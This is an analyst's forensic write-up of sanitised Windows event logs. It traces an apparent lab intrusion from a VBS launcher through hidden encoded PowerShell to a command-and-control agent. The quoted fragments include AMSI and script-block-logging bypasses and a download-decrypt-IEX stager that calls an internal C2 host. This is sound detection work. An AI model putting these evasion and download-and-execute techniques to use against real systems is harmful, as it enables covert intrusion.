# Sanitised Key Log Extracts

These excerpts are minimal analyst-selected records from the raw JSONL. Long Base64, complete script bodies, session keys, cookies, and repeated pipeline text are omitted. `RecordNumber` is the dataset field corresponding to the source channel's event-record sequence.

## L01 - Explorer launched the VBS through WScript

```text
[Sysmon Event 1 | RecordNumber 251079]
UtcTime: 2020-09-04 20:09:55.035
Computer: WORKSTATION5.theshire.local
ProcessGuid: {860ba2e3-9f13-5f52-2603-000000000400}
ProcessId: 2440
Image: C:\Windows\System32\wscript.exe
CommandLine: "C:\windows\System32\WScript.exe" "C:\Users\pgustavo\Desktop\launcher.vbs"
User: THESHIRE\pgustavo
LogonId: 0x2D5A4B
IntegrityLevel: Medium
ParentProcessGuid: {860ba2e3-993f-5f52-8402-000000000400}
ParentProcessId: 5728
ParentImage: C:\Windows\explorer.exe
```

Security 4688 RecordNumber `66940` independently reports `NewProcessId=0x988` (2440) and `CreatorProcessId=0x1660` (5728).

## L02 - WScript launched hidden encoded PowerShell

```text
[Sysmon Event 1 | RecordNumber 251258]
UtcTime: 2020-09-04 20:09:55.760
ProcessGuid: {860ba2e3-9f13-5f52-2703-000000000400}
ProcessId: 2316
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell.exe -noP -sta -w 1 -enc <5056-character Base64 omitted>
User: THESHIRE\pgustavo
LogonId: 0x2D5A4B
IntegrityLevel: Medium
ParentProcessGuid: {860ba2e3-9f13-5f52-2603-000000000400}
ParentProcessId: 2440
ParentImage: C:\Windows\System32\wscript.exe
```

Security 4688 RecordNumber `66981` independently reports `NewProcessId=0x90c` (2316) and `CreatorProcessId=0x988` (2440).

## L03 - Initial stager behaviours

```text
[PowerShell 4104 | RecordNumber 1948]
ExecutionProcessID: 2316
ScriptBlockId: 6e4c1b59-2eb8-4934-9e78-32cd88822dbb
UserID: S-1-5-21-2079883792-3656946353-945924832-1104

... cachedGroupPolicySettings ...
... 'ScriptB'+'lockLogging' ... = 0 ...
... 'Amsi'+'Utils' ... 'amsiInitF'+'ailed' ... SetValue($null,$true) ...
$ser = <nested Base64; offline decode: http://10.10.10.5>
$t = '/news.php'
$data = $WebClient.DownloadData($ser + $t)
... RC4-like transform ... | IEX
```

The complete `ScriptBlockText`, hashed as UTF-8 for analyst reference, is `cca88ef46c983e164828873bdb2494227ba50fc16d8496553ea83c5129dfd974`.

## L04 - PowerShell network connection

```text
[Sysmon Event 3 | RecordNumber 251809]
UtcTime: 2020-09-04 20:09:59.621
ProcessGuid: {860ba2e3-9f13-5f52-2703-000000000400}
ProcessId: 2316
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: THESHIRE\pgustavo
Protocol: tcp
Initiated: true
SourceIp: 172.18.39.5
SourcePort: 50699
DestinationIp: 10.10.10.5
DestinationPort: 80
```

Security 5156 RecordNumber `67323` independently records the same process, addresses, ports, protocol, and outbound direction.

## L05 - Downloaded stage appeared in the same session

```text
[Windows PowerShell Event 800 | RecordNumber 1364]
HostId: 39315e7d-5bea-48aa-8ea8-21c983c954a8
RunspaceId: 2f526b39-34e5-4958-8786-a61c85685778
PipelineId: 1

$wc.UploadData($s + "/login/process.php", "POST", ...)
$wc.UploadData($s + "/news.php", "POST", ...)
... RSA negotiation ... AES-CBC ... HMAC ... RC4 ...
IEX $(... Decrypt-Bytes ...)
XC0SA -Servers ... -StagingKey ... -SessionKey ... -SessionID ...
```

This code is absent from the initial 4104 stager but appears after `DownloadData -> decrypt -> IEX`, in the same PowerShell HostId and RunspaceId.

## L06 - Local WMI discovery

```text
[PowerShell 4103 | RecordNumbers 1962 and 1963]
ExecutionProcessID: 2316
HostId: 39315e7d-5bea-48aa-8ea8-21c983c954a8
RunspaceId: 2f526b39-34e5-4958-8786-a61c85685778
Command: Get-WmiObject
Class: Win32_NetworkAdapterConfiguration
Command: Get-WmiObject
Class: Win32_OperatingSystem
```

The related WMI provider process was launched by `svchost.exe` under `NETWORK SERVICE`; it was not a direct PowerShell child and does not show remote WMI execution.

## L07 - Agent task execution and output

```text
[Windows PowerShell Event 800 | RecordNumber 1417]
HostId: 39315e7d-5bea-48aa-8ea8-21c983c954a8
RunspaceId: 2f526b39-34e5-4958-8786-a61c85685778
CommandInvocation: Invoke-Expression
ParameterBinding: Command = "whoami"

[Sysmon Event 1 | RecordNumber 251944]
UtcTime: 2020-09-04 20:10:22.845
ProcessGuid: {860ba2e3-9f2e-5f52-2a03-000000000400}
ProcessId: 9152
Image: C:\Windows\System32\whoami.exe
ParentProcessGuid: {860ba2e3-9f13-5f52-2703-000000000400}
ParentProcessId: 2316

[PowerShell 4103 | RecordNumber 1999]
Output: theshire\pgustavo
        ..Command execution completed.
```

These three records close the task chain from agent code to operating-system process and returned result.
